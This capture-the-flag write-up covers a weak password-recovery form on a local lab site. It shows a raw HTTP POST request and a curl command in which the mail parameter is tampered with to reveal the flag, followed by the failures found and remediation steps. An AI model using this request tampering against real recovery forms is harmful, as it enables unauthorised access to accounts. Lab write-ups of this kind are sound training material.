# Forgot My Password - Broken Authentication

## Vulnerability Type
**OWASP A07:2021 - Identification and Authentication Failures** (CWE-640: Weak Password Recovery Mechanism)

## Exploitation 

```txt
POST /index.php?page=recover HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://localhost:8081
Connection: keep-alive
Referer: http://localhost:8081/index.php?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

mail=webmaster%40borntosec.com&Submit=Submit
```

I changed the last line to my email addr and got the flag displayed.

In curl I can send a POST like this:

```bash
curl -X POST http://localhost:8081/index.php\?page\=recover \
     -d "mail=web%40born.com&Submit=Submit" | grep "flag"
``` 

The above command works anytime—no authentication required. No need to inspect or modify the HTML.

## Key Failures

1. **No authorization check** – Any email address returns the flag (should verify ownership first)
2. **No rate limiting** – Brute-forceable (could enumerate valid email accounts)
3. **Exposes sensitive info** – Flag returned directly without verification
4. **No CSRF protection** – POST request has no token validation
5. **No OTP/token** – Should send unique recovery link, not immediate flag

## Remediation
1. **Implement email verification** – Send a unique, time-limited recovery token (expires in 15-30 min)
2. **Rate limiting** – Limit password recovery requests per email/IP (e.g., 3 per hour)
3. **Never expose secrets directly** – Return recovery link, not flags or credentials
4. **Add CSRF tokens** – Validate `csrf_token` on password recovery forms
5. **Log recovery attempts** – Monitor suspicious patterns (multiple emails, rapid requests)
6. **Use HTTPS only** – Encrypt recovery tokens in transit
7. **Implement MFA** – Require second factor for sensitive operations
8. **No security questions** – They provide weak verification (knowledge-based answers are guessable)



